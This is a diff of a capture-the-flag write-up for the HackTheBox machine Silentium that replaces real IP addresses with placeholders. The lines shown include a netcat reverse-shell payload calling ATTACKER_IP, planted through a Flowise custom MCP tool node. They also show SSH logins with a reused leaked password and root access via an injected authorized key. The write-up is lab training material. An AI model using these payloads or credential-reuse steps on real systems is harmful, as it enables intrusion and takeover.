@@ -1,6 +1,6 @@
 # Silentium - HackTheBox Writeup
 
-**Target:** `10.129.32.185`
+**Target:** `TARGET_IP`
 **Domain:** `silentium.htb`
 **OS:** Linux (Docker-based with Gogs)
 **Difficulty:** Medium/Hard
@@ -47,7 +47,7 @@ Write to /root/.ssh/authorized_keys → SSH as root → Root Flag
 
 ### Host Setup
 ```bash
-echo "10.129.32.185 silentium.htb" | sudo tee -a /etc/hosts
+echo "TARGET_IP silentium.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Subdomain Discovery
@@ -60,7 +60,7 @@ gobuster vhost -u http://silentium.htb -w /usr/share/seclists/Discovery/DNS/subd
 **Result:** `staging.silentium.htb` discovered.
 
 ```bash
-echo "10.129.32.185 staging.silentium.htb" | sudo tee -a /etc/hosts
+echo "TARGET_IP staging.silentium.htb" | sudo tee -a /etc/hosts
 ```
 
 ### API Endpoint Enumeration
@@ -170,7 +170,7 @@ Add a **Custom MCP Tool** node to the flow. This tool allows specification of a 
 ```json
 {
   "command": "sh",
-  "args": ["-c", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.91 4444 >/tmp/f"]
+  "args": ["-c", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f"]
 }
 ```
 
@@ -178,7 +178,7 @@ Add a **Custom MCP Tool** node to the flow. This tool allows specification of a 
 - `rm /tmp/f` — Remove any existing FIFO file
 - `mkfifo /tmp/f` — Create a named pipe (FIFO) for bidirectional communication
 - `cat /tmp/f | /bin/sh -i 2>&1` — Read from pipe, execute shell, redirect stderr to stdout
-- `nc 10.10.14.91 4444 >/tmp/f` — Send shell output to attacker, write input back to pipe
+- `nc ATTACKER_IP 4444 >/tmp/f` — Send shell output to attacker, write input back to pipe
 
 **4. Set up Listener**
 ```bash
@@ -191,11 +191,11 @@ Click **Refresh** or **Run** on the agent flow to execute the custom tool.
 
 **6. Reverse Shell Received:**
 ```bash
-connect to [10.10.14.91] from (UNKNOWN) [10.129.32.185] 4444
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
 / # 
 ```
 
-**✅ Initial access achieved as `root` inside an Alpine Linux container (`172.18.0.2`).**
+**✅ Initial access achieved as `root` inside an Alpine Linux container (`CONTAINER_IP`).**
 
 ---
 
@@ -206,7 +206,7 @@ connect to [10.10.14.91] from (UNKNOWN) [10.129.32.185] 4444
 ```bash
 # Check hostname
 hostname
-# 172.18.0.2
+# CONTAINER_IP
 
 # Check OS
 cat /etc/os-release
@@ -224,21 +224,21 @@ id
 ```bash
 # Check network interfaces
 ip addr
-# eth0: 172.18.0.2/16
+# eth0: CONTAINER_IP/16
 
 # ARP scan for other containers
 arp -a
-# 172.18.0.1 (gateway/host)
-# 172.18.0.3 (another container)
+# DOCKER_GW (gateway/host)
+# SIBLING_CONTAINER_IP (another container)
 ```
 
 **Internal Network Map:**
 
 | IP            | Service          | Description                    |
 |---------------|------------------|--------------------------------|
-| `172.18.0.1`  | Host / Gateway   | Docker host machine            |
-| `172.18.0.2`  | Flowise          | Our container (AI workflow)    |
-| `172.18.0.3`  | MailHog          | Email testing service          |
+| `DOCKER_GW`  | Host / Gateway   | Docker host machine            |
+| `CONTAINER_IP`  | Flowise          | Our container (AI workflow)    |
+| `SIBLING_CONTAINER_IP`  | MailHog          | Email testing service          |
 
 ### Environment Variable Enumeration
 
@@ -282,7 +282,7 @@ The `SMTP_PASSWORD` discovered in the container environment variables was **reus
 - **Password:** `r04D!!_R4ge`
 
 ```bash
-ssh ben@10.129.32.185
+ssh ben@TARGET_IP
 # Password: r04D!!_R4ge
 ```
 
@@ -361,7 +361,7 @@ SSH as root → Root Flag
 ### Step 1 — SSH Tunnel
 
 ```bash
-ssh -L 8080:127.0.0.1:3001 ben@10.129.32.185
+ssh -L 8080:127.0.0.1:3001 ben@TARGET_IP
 ```
 
 **Result:** Gogs web interface accessible at `http://127.0.0.1:8080`.
@@ -446,7 +446,7 @@ curl -X PUT "http://127.0.0.1:8080/api/v1/repos/123/pwn/contents/link" \
 ### Step 8 — SSH as Root
 
 ```bash
-ssh -i /tmp/htb_key root@10.129.32.185
+ssh -i /tmp/htb_key root@TARGET_IP
 ```
 
 **Result:** ✅ Root access achieved on the host system.
